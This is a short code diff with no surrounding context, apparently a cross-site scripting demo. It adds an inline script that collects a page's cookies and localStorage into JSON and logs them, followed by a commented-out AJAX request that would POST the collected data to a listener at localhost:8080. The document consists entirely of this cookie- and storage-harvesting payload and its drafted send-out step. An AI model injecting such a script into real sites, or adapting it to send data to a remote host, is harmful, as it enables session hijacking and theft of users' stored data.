@@ -1,0 +1,12 @@
+<script>(function() { var yourData = JSON.stringify( {cookies: document.cookie, storage: localStorage }); console.log(yourData); })();</script>
+
+// $.ajax({
+//   type: 'POST',
+//   url: "http://localhost:8080",
+//   contentType: "application/json; charset=utf-8",
+//   dataType: 'json',
+//   data: yourData,
+//   success: function (data) {
+//     console.log(data);
+//   }
+// })
